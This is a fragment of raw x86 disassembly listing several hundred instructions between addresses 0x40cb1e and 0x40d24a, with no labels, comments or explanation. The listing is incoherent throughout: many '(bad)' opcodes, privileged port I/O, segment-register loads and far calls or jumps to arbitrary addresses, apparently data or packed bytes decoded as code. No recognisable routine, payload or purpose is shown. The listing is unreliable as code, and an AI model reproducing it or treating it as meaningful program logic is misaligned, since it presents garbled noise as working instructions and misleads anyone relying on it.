  40cb1e:	push   0x3cf0e042
  40cb23:	dec    ebp
  40cb24:	jae    0x40cb65
  40cb26:	(bad)  
  40cb27:	or     eax,0xfedf289
  40cb2c:	in     eax,0x80
  40cb2e:	mov    esp,0xfb1675b8
  40cb33:	cmc    
  40cb34:	xchg   ecx,eax
  40cb35:	in     eax,dx
  40cb36:	out    0x64,eax
  40cb38:	out    0xa2,al
  40cb3a:	xchg   esi,eax
  40cb3b:	int3   
  40cb3c:	lods   eax,DWORD PTR ds:[esi]
  40cb3d:	or     ebp,DWORD PTR gs:[esi+0x2c8d614f]
  40cb44:	int3   
  40cb45:	(bad)  
  40cb46:	mov    ch,0xb
  40cb48:	sbb    eax,0x425dbaad
  40cb4d:	or     eax,0x2e44ed10
  40cb52:	dec    ecx
  40cb53:	cmc    
  40cb54:	popf   
  40cb55:	jnp    0x40cb8a
  40cb57:	xor    eax,0x3b3de280
  40cb5c:	add    ah,BYTE PTR [esi]
  40cb5e:	cmp    al,0xf8
  40cb60:	outs   dx,BYTE PTR ds:[esi]
  40cb61:	das    
  40cb62:	out    0x5c,eax
  40cb64:	jno    0x40cb97
  40cb66:	cmp    esi,esp
  40cb68:	mov    cl,0xa0
  40cb6a:	arpl   WORD PTR [ebx],dx
  40cb6c:	pop    ds
  40cb6d:	jo     0x40cb67
  40cb6f:	mov    eax,0x63191401
  40cb74:	sub    BYTE PTR [eax],al
  40cb76:	dec    ebp
  40cb77:	mov    dl,BYTE PTR [edx]
  40cb79:	add    ebp,edx
  40cb7b:	and    BYTE PTR [edi+0x47],al
  40cb7e:	push   esp
  40cb7f:	mov    gs,WORD PTR [edx]
  40cb81:	imul   ebx,DWORD PTR [edi+0x1cc0c32],0xffffffa8
  40cb88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb89:	daa    
  40cb8a:	(bad)  
  40cb8b:	(bad)  [edi+0x7f]
  40cb8e:	nop
  40cb8f:	mov    eax,ds:0xa8282088
  40cb94:	push   ebp
  40cb95:	cmc    
  40cb96:	frstor [ecx]
  40cb98:	or     DWORD PTR [ebx],esp
  40cb9a:	ret    
  40cb9b:	sti    
  40cb9c:	mov    bh,0xf1
  40cb9e:	xor    eax,0x98ab9827
  40cba3:	callw  0x65dd
  40cba7:	rol    BYTE PTR [eax],cl
  40cba9:	inc    ebp
  40cbaa:	and    eax,0x904870ec
  40cbaf:	jns    0x40cb69
  40cbb1:	mov    edx,0x18409de6
  40cbb6:	push   es
  40cbb7:	inc    ecx
  40cbb8:	adc    dl,cl
  40cbba:	jg     0x40cb41
  40cbbc:	mov    bl,0x73
  40cbbe:	xor    BYTE PTR [edi+0x7a3bec37],bl
  40cbc4:	or     cl,BYTE PTR [ebp+0x67]
  40cbc7:	pusha  
  40cbc8:	mov    esp,0xd4da3a2c
  40cbcd:	or     ebx,esi
  40cbcf:	sbb    bh,ch
  40cbd1:	pop    ss
  40cbd2:	scas   al,BYTE PTR es:[edi]
  40cbd3:	pop    edx
  40cbd4:	dec    esi
  40cbd5:	dec    ecx
  40cbd6:	inc    ecx
  40cbd7:	and    BYTE PTR [edi+0x3],al
  40cbda:	loopne 0x40cb9b
  40cbdc:	rcr    DWORD PTR [ebp*2+0x47234c8b],0x35
  40cbe4:	or     ah,BYTE PTR [esi-0x26149386]
  40cbea:	sbb    eax,0xdcddab4a
  40cbef:	je     0x40cbd5
  40cbf1:	ja     0x40cc25
  40cbf3:	mov    gs:0xf87fb460,eax
  40cbf9:	arpl   WORD PTR [ecx],dx
  40cbfb:	push   ecx
  40cbfc:	cmp    ebp,DWORD PTR [edi+0x3c]
  40cbff:	jmp    FWORD PTR [ecx]
  40cc01:	cmp    al,0xed
  40cc03:	xchg   bl,bl
  40cc05:	ss in  al,dx
  40cc07:	(bad)  
  40cc08:	loope  0x40cc7c
  40cc0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc0b:	dec    esi
  40cc0c:	out    0xfb,al
  40cc0e:	add    DWORD PTR [edi-0x2c],ecx
  40cc11:	jo     0x40cc52
  40cc13:	xor    edi,DWORD PTR [ebx-0x44]
  40cc16:	jmp    0x68ae2caf
  40cc1b:	push   esp
  40cc1c:	inc    ecx
  40cc1d:	mov    edx,ebp
  40cc1f:	sbb    eax,esi
  40cc21:	jl     0x40cc53
  40cc23:	jb     0x40cc97
  40cc25:	mov    ds:0x95737a52,eax
  40cc2a:	popa   
  40cc2b:	out    dx,eax
  40cc2c:	mov    ds:0x29fccf28,eax
  40cc31:	push   ds
  40cc32:	gs scas eax,DWORD PTR es:[edi]
  40cc34:	jle    0x40cc08
  40cc36:	xchg   eax,esi
  40cc38:	loope  0x40cc28
  40cc3a:	loopne 0x40cbf6
  40cc3c:	cmp    BYTE PTR [ebx+0x46],ch
  40cc3f:	add    al,0x96
  40cc41:	push   ds
  40cc42:	pop    ss
  40cc43:	xor    al,0x1f
  40cc45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc46:	leave  
  40cc47:	xchg   edx,eax
  40cc48:	or     al,0x7b
  40cc4a:	mov    ds:0x513d4e3d,al
  40cc4f:	popa   
  40cc50:	les    edx,FWORD PTR [esi]
  40cc52:	mov    esp,DWORD PTR [ecx+0x9]
  40cc55:	in     eax,0x53
  40cc57:	rcl    bl,cl
  40cc59:	xchg   esp,eax
  40cc5a:	gs iret 
  40cc5c:	push   ecx
  40cc5d:	fcmovnbe st,st(7)
  40cc5f:	xchg   esp,eax
  40cc60:	mov    ds:0xcc371690,eax
  40cc65:	mov    cl,0x58
  40cc67:	ror    DWORD PTR [esi],0x8b
  40cc6a:	dec    ebp
  40cc6b:	ret    
  40cc6c:	int    0xfa
  40cc6e:	outs   dx,BYTE PTR ds:[esi]
  40cc6f:	dec    ebx
  40cc70:	pop    esp
  40cc71:	or     dh,ah
  40cc73:	jmp    0xeb95b278
  40cc78:	sub    eax,0xe7711744
  40cc7d:	dec    edx
  40cc7e:	cmp    BYTE PTR [esi-0x42],dl
  40cc81:	cmp    cl,BYTE PTR [ecx-0x5b]
  40cc84:	pop    ebp
  40cc85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc86:	inc    ecx
  40cc87:	data16 shr ah,0xe
  40cc8b:	scas   eax,DWORD PTR es:[edi]
  40cc8c:	sbb    DWORD PTR [eax],edx
  40cc8e:	test   BYTE PTR [eax+0x7f],cl
  40cc91:	jae    0x40ccb3
  40cc93:	inc    esi
  40cc94:	add    BYTE PTR [edi+0x566ce906],bl
  40cc9a:	sbb    dh,dl
  40cc9c:	add    BYTE PTR [edi],al
  40cc9e:	aad    0x70
  40cca0:	fs xchg edi,eax
  40cca2:	imul   esi,esi,0xffffffb2
  40cca5:	add    al,0x48
  40cca7:	clc    
  40cca8:	pusha  
  40cca9:	dec    ebp
  40ccaa:	ins    BYTE PTR es:[edi],dx
  40ccab:	not    BYTE PTR [edi+eiz*8-0x6caafcc]
  40ccb2:	mov    ds:0xfa1b6622,eax
  40ccb7:	repnz cs out dx,eax
  40ccba:	xchg   ebx,eax
  40ccbb:	iret   
  40ccbc:	inc    esi
  40ccbd:	push   eax
  40ccbe:	dec    ebp
  40ccbf:	and    bl,dh
  40ccc1:	popf   
  40ccc2:	xchg   ebp,eax
  40ccc3:	adc    eax,0xf1f6104f
  40ccc8:	and    al,0xee
  40ccca:	or     eax,0x6e6eaa20
  40cccf:	lods   al,BYTE PTR ds:[esi]
  40ccd0:	or     dl,BYTE PTR [ecx]
  40ccd2:	pop    ebp
  40ccd3:	(bad)  
  40ccd4:	lock icebp 
  40ccd6:	fistp  WORD PTR [esi]
  40ccd8:	cdq    
  40ccd9:	dec    ebp
  40ccda:	call   0xe44:0x9a8b4260
  40cce1:	call   0x1453355a
  40cce6:	adc    DWORD PTR [esi-0x26],ecx
  40cce9:	fs dec ebx
  40cceb:	shl    dl,1
  40cced:	or     esi,DWORD PTR [ecx+0x3f551504]
  40ccf3:	inc    ebp
  40ccf4:	mov    edx,0x9f42e37a
  40ccf9:	imul   edi,esi,0x61e0bc35
  40ccff:	repz lock cmp esi,ebp
  40cd03:	xor    al,0xe9
  40cd05:	cmp    al,0x1d
  40cd07:	les    edx,FWORD PTR [ecx]
  40cd09:	inc    edx
  40cd0a:	inc    esi
  40cd0b:	fst    QWORD PTR ds:0x324229fc
  40cd11:	(bad)  
  40cd12:	das    
  40cd13:	adc    BYTE PTR [ebp-0x2843c5a9],ch
  40cd19:	push   ebp
  40cd1a:	test   eax,0x99c56441
  40cd1f:	sbb    al,0x52
  40cd21:	push   ecx
  40cd22:	lds    esp,FWORD PTR [edi-0x74e009d]
  40cd28:	rcl    cl,cl
  40cd2a:	hlt    
  40cd2b:	out    0x61,al
  40cd2d:	xor    dl,BYTE PTR [edi+0x2b]
  40cd30:	enter  0x9167,0xf4
  40cd34:	add    BYTE PTR [edx+0x6d],dl
  40cd37:	pop    ss
  40cd38:	push   ecx
  40cd39:	aaa    
  40cd3a:	jg     0x40cd07
  40cd3c:	ds loope 0x40cd39
  40cd3f:	test   DWORD PTR [edx-0x49],edi
  40cd42:	adc    eax,0x67e937ba
  40cd47:	jle    0x40cd52
  40cd49:	jecxz  0x40cd2a
  40cd4b:	cmp    ecx,DWORD PTR [edi-0x66]
  40cd4e:	in     eax,dx
  40cd4f:	mov    ebp,0x13042d17
  40cd54:	or     al,0xa3
  40cd56:	in     al,dx
  40cd57:	mov    ebx,0x6ec624a2
  40cd5c:	test   BYTE PTR [edi-0x3556e312],cl
  40cd62:	pop    eax
  40cd63:	jle    0x40cdac
  40cd65:	cmp    eax,0x51d0b4e1
  40cd6a:	push   edi
  40cd6b:	mov    ds:0xb538aab4,al
  40cd70:	and    edi,edx
  40cd72:	push   eax
  40cd73:	addr16 adc al,al
  40cd76:	repnz sub eax,0xe883f79
  40cd7c:	mov    ch,0xfa
  40cd7e:	or     eax,0xeea0970f
  40cd83:	or     BYTE PTR [edi+0x41],bl
  40cd86:	cmp    ecx,DWORD PTR [ebx+0x2c]
  40cd89:	or     DWORD PTR [esi-0x75],ebx
  40cd8c:	rol    DWORD PTR [esi+edx*2+0x4413659d],0x6b
  40cd94:	addr16 xchg ebx,eax
  40cd96:	(bad)  
  40cd97:	cmc    
  40cd98:	adc    BYTE PTR [ebx+eiz*1-0x66bf2ea5],0x5
  40cda0:	jg     0x40cda4
  40cda2:	adc    ah,BYTE PTR ds:0x2bd4937b
  40cda8:	mov    edx,0x72100def
  40cdad:	loop   0x40ce23
  40cdaf:	jo     0x40ce04
  40cdb1:	jns    0x40cdfb
  40cdb3:	sub    bl,ch
  40cdb5:	xor    eax,0x39a48492
  40cdba:	xchg   edi,eax
  40cdbb:	xchg   ebx,eax
  40cdbc:	cmp    BYTE PTR [eax+0x48f03111],dl
  40cdc2:	cld    
  40cdc3:	dec    esi
  40cdc4:	arpl   WORD PTR [esi-0x1b],bp
  40cdc7:	jmp    0x40cddf
  40cdc9:	mov    ecx,ecx
  40cdcb:	pop    edx
  40cdcc:	(bad)  
  40cdcd:	mov    bl,0xb0
  40cdcf:	jmp    0x40cd9e
  40cdd1:	dec    ecx
  40cdd2:	xchg   esi,eax
  40cdd3:	sti    
  40cdd4:	inc    eax
  40cdd5:	cmp    ecx,esi
  40cdd7:	shr    ebp,cl
  40cdd9:	jne    0x40ce39
  40cddb:	xor    al,BYTE PTR [edx+0x61]
  40cdde:	(bad)  
  40cddf:	xor    BYTE PTR [edi-0x6d],al
  40cde2:	mov    ch,0x3c
  40cde4:	fs cwde 
  40cde6:	mov    ah,0x2f
  40cde8:	mov    ebx,0x79a617d4
  40cded:	das    
  40cdee:	add    dh,0x50
  40cdf1:	jmp    0xb761:0x164233fe
  40cdf8:	mov    ebx,ebx
  40cdfa:	sub    eax,0xe2301be
  40cdff:	mov    bh,0x81
  40ce01:	mov    bh,0x25
  40ce03:	cmp    BYTE PTR [ecx+edi*1+0x27],bl
  40ce07:	sub    eax,0xb8f904b8
  40ce0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce0d:	icebp  
  40ce0e:	out    0xb2,al
  40ce10:	test   eax,0xa661c8b3
  40ce15:	xchg   BYTE PTR [edx],bh
  40ce17:	pusha  
  40ce18:	xchg   esi,eax
  40ce19:	rol    DWORD PTR [edi+0x6c05bf82],cl
  40ce1f:	push   cs
  40ce20:	cli    
  40ce21:	jo     0x40ce43
  40ce23:	mov    BYTE PTR [eax+0x4ea62389],bl
  40ce29:	push   0x63d27521
  40ce2e:	jbe    0x40ce3d
  40ce30:	jnp    0x40ce57
  40ce32:	and    al,0xe4
  40ce34:	mov    ch,0x99
  40ce37:	xchg   BYTE PTR [edi-0x51249a46],bh
  40ce3d:	addr16 jo 0x40ce2f
  40ce40:	sbb    ah,BYTE PTR [eax+0x5a]
  40ce43:	shl    ah,cl
  40ce45:	sbb    DWORD PTR [eax-0x2b63cfc6],esp
  40ce4b:	lods   al,BYTE PTR ds:[esi]
  40ce4c:	and    eax,0x8754ab50
  40ce51:	add    bh,cl
  40ce53:	sti    
  40ce54:	mov    edi,0xdedace1
  40ce59:	(bad)  
  40ce5a:	jae    0x40ce9f
  40ce5c:	mov    esp,0x4f823fd5
  40ce61:	or     eax,DWORD PTR [edi+esi*1]
  40ce64:	cs dec ecx
  40ce66:	push   ebp
  40ce67:	pop    esp
  40ce68:	and    DWORD PTR [ecx],ecx
  40ce6a:	icebp  
  40ce6b:	push   ebp
  40ce6c:	add    eax,0x64f6e23d
  40ce71:	add    DWORD PTR [ebx],esi
  40ce73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce74:	call   0x7ed82fcd
  40ce79:	or     DWORD PTR [ebx],esi
  40ce7b:	aaa    
  40ce7c:	aaa    
  40ce7d:	call   0xc732025c
  40ce82:	adc    al,0x75
  40ce84:	dec    edi
  40ce85:	addr16 push ss
  40ce87:	pop    ss
  40ce88:	cdq    
  40ce89:	pop    ecx
  40ce8a:	into   
  40ce8b:	xchg   ecx,eax
  40ce8c:	jge    0x40ce70
  40ce8e:	push   ds
  40ce8f:	daa    
  40ce90:	lea    eax,[esi]
  40ce92:	out    dx,al
  40ce93:	xchg   edx,eax
  40ce94:	sbb    edx,DWORD PTR [edi]
  40ce96:	pop    edi
  40ce97:	push   ebp
  40ce98:	in     al,0x6b
  40ce9a:	rol    BYTE PTR [ebx+0x68],0x7f
  40ce9e:	repnz pushf 
  40cea0:	(bad)  
  40cea1:	xchg   DWORD PTR [edi],edx
  40cea3:	pop    ebx
  40cea4:	outs   dx,DWORD PTR ds:[esi]
  40cea5:	mov    ch,BYTE PTR [ecx]
  40cea7:	into   
  40cea8:	push   ebp
  40cea9:	cmp    al,0xb7
  40ceab:	arpl   WORD PTR [ebx],bx
  40cead:	cs push edx
  40ceaf:	jl     0x40cef7
  40ceb1:	xchg   esi,eax
  40ceb2:	jo     0x40cee8
  40ceb4:	call   DWORD PTR [ebx]
  40ceb6:	push   ds
  40ceb7:	mov    cl,0xc6
  40ceb9:	xchg   ebx,eax
  40ceba:	mov    cl,0xe7
  40cebc:	pop    ecx
  40cebd:	cmp    DWORD PTR [edx],ebx
  40cebf:	xchg   ecx,eax
  40cec0:	ins    BYTE PTR es:[edi],dx
  40cec1:	mov    ds:0x681b5f12,eax
  40cec6:	into   
  40cec7:	xor    al,0xfe
  40cec9:	inc    ebx
  40ceca:	push   ecx
  40cecb:	in     eax,0x34
  40cecd:	xchg   edi,eax
  40cece:	neg    BYTE PTR [ecx+0x5d25ced8]
  40ced4:	adc    al,0x52
  40ced6:	add    ebp,0x41
  40ced9:	jae    0x40cf2d
  40cedb:	ror    DWORD PTR [ebx],cl
  40cedd:	cmp    bl,BYTE PTR [edx+0x67c2ec5b]
  40cee3:	cdq    
  40cee4:	adc    DWORD PTR [esi+0x6917041a],ebx
  40ceea:	adc    BYTE PTR ds:0xa77dabd4,al
  40cef0:	dec    edx
  40cef1:	mov    al,0xa
  40cef3:	push   0x2113e54b
  40cef8:	loope  0x40cf17
  40cefa:	scas   al,BYTE PTR es:[edi]
  40cefb:	or     cl,BYTE PTR [esi+0x73a83cc0]
  40cf01:	test   al,0xb3
  40cf03:	fild   QWORD PTR [edx-0x3f]
  40cf06:	mov    dl,0xf
  40cf08:	sbb    ebp,DWORD PTR [edx+0x49665bb4]
  40cf0e:	ret    
  40cf0f:	add    eax,0xd73f29ce
  40cf14:	aad    0x2f
  40cf16:	outs   dx,DWORD PTR ds:[esi]
  40cf17:	adc    esp,DWORD PTR [edx]
  40cf19:	or     BYTE PTR [ebp-0x71e6ef35],dl
  40cf1f:	pop    ebx
  40cf20:	inc    ebx
  40cf21:	adc    DWORD PTR [ebp-0x12b86c2c],ebx
  40cf27:	push   eax
  40cf28:	add    eax,0x7690b572
  40cf2d:	sbb    BYTE PTR [ebx+0x475077d1],0x4b
  40cf34:	xor    DWORD PTR [edx],ebp
  40cf36:	ret    0x6f3c
  40cf39:	cmp    dl,0xff
  40cf3c:	sahf   
  40cf3d:	mov    edi,0xb415837f
  40cf42:	ja     0x40cf94
  40cf44:	sub    edi,eax
  40cf46:	nop
  40cf47:	jle    0x40cf2b
  40cf49:	push   cs
  40cf4a:	outs   dx,BYTE PTR ds:[esi]
  40cf4b:	jmp    0x40ced4
  40cf4d:	clc    
  40cf4e:	retf   0x1853
  40cf51:	lahf   
  40cf52:	retf   
  40cf53:	mov    bh,0x13
  40cf55:	inc    esp
  40cf56:	je     0x40cfa9
  40cf58:	aam    0xf2
  40cf5a:	inc    edx
  40cf5b:	lea    edi,[ecx+ecx*2]
  40cf5e:	jb     0x40cfd0
  40cf60:	fsub   DWORD PTR [edx+ecx*1]
  40cf63:	(bad)  
  40cf64:	dec    edi
  40cf65:	shl    DWORD PTR [edi+edi*2-0x715831ef],cl
  40cf6c:	enter  0x7de8,0xc2
  40cf70:	das    
  40cf71:	add    al,0xa8
  40cf73:	sub    eax,0x709c782a
  40cf78:	ret    
  40cf79:	pop    ebp
  40cf7a:	in     al,dx
  40cf7b:	mov    ah,0x90
  40cf7d:	mov    ebp,0x67fd6b67
  40cf82:	clc    
  40cf83:	dec    ebx
  40cf84:	xchg   BYTE PTR [ebx],bh
  40cf86:	xchg   esp,eax
  40cf87:	(bad)  
  40cf88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf89:	inc    edx
  40cf8a:	loope  0x40cf51
  40cf8c:	xor    BYTE PTR [eax-0x3],ch
  40cf8f:	jns    0x40cfcd
  40cf91:	bound  esi,QWORD PTR [esi-0x14]
  40cf94:	(bad)  
  40cf96:	pop    ebp
  40cf97:	das    
  40cf98:	pop    ds
  40cf99:	loop   0x40cffe
  40cf9b:	inc    edx
  40cf9c:	pop    ecx
  40cf9d:	int3   
  40cf9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf9f:	dec    eax
  40cfa0:	test   al,0xd6
  40cfa2:	sbb    al,0xce
  40cfa4:	in     al,dx
  40cfa5:	push   ebp
  40cfa6:	add    DWORD PTR [eax+ecx*8],ecx
  40cfa9:	and    al,0xc9
  40cfab:	pop    esi
  40cfac:	sub    cl,BYTE PTR [ebx-0x116371c]
  40cfb2:	mov    eax,ds:0xf06e28c8
  40cfb7:	imul   ecx,DWORD PTR [eax+0x3d957328],0xffffffda
  40cfbe:	test   eax,0xea5d0c64
  40cfc3:	(bad)  
  40cfc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfc5:	cmp    dh,BYTE PTR [edx-0x5590a2e5]
  40cfcb:	hlt    
  40cfcc:	sbb    BYTE PTR [esi],dh
  40cfce:	pop    eax
  40cfcf:	nop
  40cfd0:	mov    cl,0x33
  40cfd2:	push   esi
  40cfd3:	inc    esi
  40cfd4:	jae    0x40d020
  40cfd6:	and    al,0x81
  40cfd8:	pushf  
  40cfd9:	push   edi
  40cfda:	xchg   BYTE PTR [edi+0x1c5034eb],bh
  40cfe0:	mov    edi,0xd92941a1
  40cfe5:	xchg   ecx,eax
  40cfe6:	or     eax,0x51d0c6a8
  40cfeb:	xor    al,0x17
  40cfed:	xchg   edx,eax
  40cfee:	lock in al,dx
  40cff0:	xor    al,BYTE PTR [ebx+0x7ee2403d]
  40cff6:	mov    ah,BYTE PTR [esi]
  40cff8:	imul   ebp,DWORD PTR [ebx-0x656af3c8],0x540b326f
  40d002:	push   ebp
  40d003:	lods   al,BYTE PTR ds:[esi]
  40d004:	aad    0x1a
  40d006:	adc    DWORD PTR [ebp-0x2a],ebx
  40d009:	sub    dl,ah
  40d00b:	and    al,0x68
  40d00d:	outs   dx,DWORD PTR ds:[esi]
  40d00e:	jne    0x40d033
  40d010:	lock add DWORD PTR [edi+esi*8+0x5b],ebp
  40d015:	push   0x3b3ca6ed
  40d01a:	xor    BYTE PTR [esi-0x138fccc7],dl
  40d020:	mov    ebx,0x1b952d20
  40d025:	mov    eax,ds:0xe30ffe43
  40d02a:	mov    esi,0x61e86b3a
  40d02f:	dec    ebp
  40d030:	jge    0x40cffa
  40d032:	inc    esp
  40d033:	push   es
  40d034:	rcl    BYTE PTR [ebx-0x193b14ae],cl
  40d03a:	xchg   ebx,eax
  40d03b:	or     DWORD PTR [edx-0x52],esi
  40d03e:	daa    
  40d03f:	nop
  40d040:	mov    eax,ds:0xb3e19d92
  40d045:	mov    eax,0x9ae1728
  40d04a:	xor    ecx,eax
  40d04c:	retf   
  40d04d:	into   
  40d04e:	call   0xdb13f0d2
  40d053:	dec    esp
  40d054:	pop    ss
  40d055:	popa   
  40d056:	shl    BYTE PTR [edi+ebx*1+0x59],cl
  40d05a:	pop    edx
  40d05b:	icebp  
  40d05c:	lods   al,BYTE PTR ds:[esi]
  40d05d:	or     DWORD PTR [ebx],ebx
  40d05f:	imul   esp,DWORD PTR [edi-0x7],0xffffffd2
  40d063:	and    BYTE PTR [esi+edi*2],bh
  40d066:	or     esp,edi
  40d068:	(bad)  
  40d069:	neg    BYTE PTR [edx+0x12]
  40d06c:	leave  
  40d06d:	(bad)  
  40d06e:	sbb    dl,BYTE PTR [ebx-0x74]
  40d071:	clc    
  40d072:	pop    ds
  40d073:	call   0x235e:0xcf6d0097
  40d07a:	repnz div DWORD PTR [esi]
  40d07d:	(bad)  
  40d07e:	lock dec esi
  40d080:	push   ebp
  40d081:	mov    cs,edx
  40d083:	bound  esi,QWORD PTR [esp+edx*1-0x55a65747]
  40d08a:	aaa    
  40d08b:	adc    al,0x8a
  40d08d:	scas   al,BYTE PTR es:[edi]
  40d08e:	scas   eax,DWORD PTR es:[edi]
  40d08f:	sar    ebx,0x47
  40d092:	or     BYTE PTR [eax+0x6893c90e],bh
  40d098:	lods   al,BYTE PTR ds:[esi]
  40d099:	je     0x40d05c
  40d09b:	popf   
  40d09c:	xchg   ebx,eax
  40d09d:	lock push ss
  40d09f:	push   edi
  40d0a0:	xor    al,0x74
  40d0a2:	repnz push ecx
  40d0a4:	sbb    ecx,DWORD PTR [ebp+0x714c7d11]
  40d0aa:	pop    ebx
  40d0ab:	stos   BYTE PTR es:[edi],al
  40d0ac:	or     eax,0x8330bdc8
  40d0b1:	inc    ebx
  40d0b2:	jecxz  0x40d0f4
  40d0b4:	pop    ss
  40d0b5:	jbe    0x40d0c0
  40d0b7:	in     eax,0x63
  40d0b9:	sbb    eax,0xccb8c053
  40d0be:	mul    DWORD PTR [esi-0x4007e97f]
  40d0c4:	popf   
  40d0c5:	stos   BYTE PTR es:[edi],al
  40d0c6:	dec    esp
  40d0c7:	setnp  BYTE PTR [ecx+0x68d592]
  40d0ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0cf:	push   esi
  40d0d0:	jb     0x40d12e
  40d0d2:	or     al,0x41
  40d0d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0d5:	rol    DWORD PTR [esi+0x26bd2f45],0x4d
  40d0dc:	loope  0x40d09a
  40d0de:	iret   
  40d0df:	or     eax,esp
  40d0e1:	fidivr WORD PTR [esi-0x4cfc9066]
  40d0e7:	in     eax,0x85
  40d0e9:	ja     0x40d071
  40d0eb:	stos   BYTE PTR es:[edi],al
  40d0ec:	adc    cl,dh
  40d0ee:	mov    dl,0xa0
  40d0f0:	retf   
  40d0f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0f2:	xchg   ebp,eax
  40d0f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0f4:	int3   
  40d0f5:	call   DWORD PTR [ebp+0x48]
  40d0f8:	mov    eax,0x2d9bd951
  40d0fd:	mov    esi,0x58fea826
  40d102:	ja     0x40d08b
  40d104:	inc    esi
  40d105:	popa   
  40d106:	pop    ebx
  40d107:	int3   
  40d108:	inc    eax
  40d109:	enter  0xad68,0xd0
  40d10d:	push   0xffffff8e
  40d10f:	xchg   edi,eax
  40d110:	ins    DWORD PTR es:[edi],dx
  40d111:	add    dh,ah
  40d113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d114:	cmp    eax,0x9110cba8
  40d119:	push   ebx
  40d11a:	pop    eax
  40d11b:	stos   BYTE PTR es:[edi],al
  40d11c:	jg     0x40d0e2
  40d11e:	add    al,0xb1
  40d120:	es jno 0x40d196
  40d123:	neg    BYTE PTR [ebp+0x34]
  40d126:	shl    DWORD PTR [ebx+eiz*2+0x1a],1
  40d12a:	adc    edx,edi
  40d12c:	clc    
  40d12d:	dec    eax
  40d12e:	jae    0x40d1a6
  40d130:	jb     0x40d11f
  40d132:	retf   0x3a48
  40d135:	in     eax,0x13
  40d137:	rcl    edi,cl
  40d139:	js     0x40d196
  40d13b:	sbb    BYTE PTR [esi],cl
  40d13d:	pop    eax
  40d13e:	scas   al,BYTE PTR es:[edi]
  40d13f:	call   0xa2d3:0xd60c2e97
  40d146:	enter  0x95c5,0x96
  40d14a:	mov    esi,0x2d9a80c0
  40d14f:	push   ss
  40d150:	sub    BYTE PTR [ecx+0x2a],dh
  40d153:	push   cs
  40d154:	les    ecx,FWORD PTR [ecx-0x28]
  40d157:	in     eax,0x59
  40d159:	repnz dec esi
  40d15b:	dec    esp
  40d15c:	mov    ds:0x288077db,al
  40d161:	mov    ah,0xac
  40d163:	cmp    eax,ebx
  40d165:	or     edx,DWORD PTR [ecx-0x760208ba]
  40d16b:	mov    ds:0x17e3e26e,eax
  40d170:	aam    0x0
  40d172:	gs in  eax,dx
  40d174:	mov    ecx,0xeeef0830
  40d179:	adc    al,0x33
  40d17b:	(bad)  
  40d17d:	pop    es
  40d17e:	lods   al,BYTE PTR cs:[esi]
  40d180:	inc    eax
  40d181:	add    al,0xf
  40d183:	pop    ecx
  40d184:	push   0x7f
  40d186:	jb     0x40d149
  40d188:	mov    ds:0xe6e1e8fc,al
  40d18d:	cmp    DWORD PTR [ecx-0x380c6374],edi
  40d193:	xchg   dl,bh
  40d195:	mov    WORD PTR [edi],es
  40d197:	inc    ebx
  40d198:	push   eax
  40d199:	mov    al,ds:0xe6ba1626
  40d19e:	push   cs
  40d19f:	cmc    
  40d1a0:	cmc    
  40d1a1:	push   0x1fc5058b
  40d1a6:	cmp    eax,0x9f15bddc
  40d1ab:	ret    0xac88
  40d1ae:	jmp    0xb965e49c
  40d1b3:	ficomp WORD PTR [ebp+0x47bf8c98]
  40d1b9:	pop    edi
  40d1ba:	sbb    dl,BYTE PTR [eax-0x71]
  40d1bd:	scas   al,BYTE PTR es:[edi]
  40d1be:	mov    eax,DWORD PTR [ebx-0x2]
  40d1c1:	fild   DWORD PTR [edi+0x5d]
  40d1c4:	ja     0x40d236
  40d1c6:	leave  
  40d1c7:	dec    esi
  40d1c8:	js     0x40d19c
  40d1ca:	and    DWORD PTR [ecx+0x3e26d700],edi
  40d1d0:	jne    0x40d1e4
  40d1d2:	jb     0x40d1dd
  40d1d4:	in     al,dx
  40d1d5:	pusha  
  40d1d6:	sbb    ebp,DWORD PTR [ecx+0x54a274a5]
  40d1dc:	and    ah,BYTE PTR fs:[ecx+0x30]
  40d1e0:	loope  0x40d1cb
  40d1e2:	xchg   DWORD PTR [esi],edx
  40d1e4:	push   ecx
  40d1e5:	and    al,0xe8
  40d1e7:	ret    0xe337
  40d1ea:	add    eax,0x105b09b7
  40d1ef:	adc    al,0xa9
  40d1f1:	xor    edi,DWORD PTR [edx+0x23]
  40d1f4:	out    0xf5,al
  40d1f6:	add    BYTE PTR [ebx],dl
  40d1f8:	int3   
  40d1f9:	pop    ebp
  40d1fa:	mov    ch,0xd5
  40d1fc:	mov    bl,0x9e
  40d1fe:	dec    ebp
  40d1ff:	fstp   TBYTE PTR [esi-0x50f02d0b]
  40d205:	and    BYTE PTR [ecx+0x6fd9ce2c],dh
  40d20b:	out    0x32,eax
  40d20d:	popf   
  40d20e:	lods   al,BYTE PTR ds:[esi]
  40d20f:	push   ss
  40d210:	push   cs
  40d211:	outs   dx,BYTE PTR ds:[esi]
  40d212:	jnp    0x40d266
  40d214:	add    al,0xd0
  40d216:	ror    DWORD PTR [edx+0x78],cl
  40d219:	jns    0x40d231
  40d21b:	xchg   esp,eax
  40d21c:	loopne 0x40d26e
  40d21e:	dec    ecx
  40d21f:	adc    BYTE PTR [edx],bh
  40d221:	ror    BYTE PTR [ecx+0x26],0x92
  40d225:	pop    es
  40d226:	icebp  
  40d227:	idiv   BYTE PTR [eax-0x7dba8427]
  40d22d:	and    DWORD PTR [ecx-0x611cbe68],edi
  40d233:	add    ah,BYTE PTR [ebx+0x42a7f956]
  40d239:	jecxz  0x40d202
  40d23b:	mov    ebx,0x9ae39d63
  40d240:	out    dx,eax
  40d241:	lea    ebp,[ecx+0x703c6b7d]
  40d247:	clc    
  40d248:	gs dec ebp
  40d24a:	jmp    0x40d1da
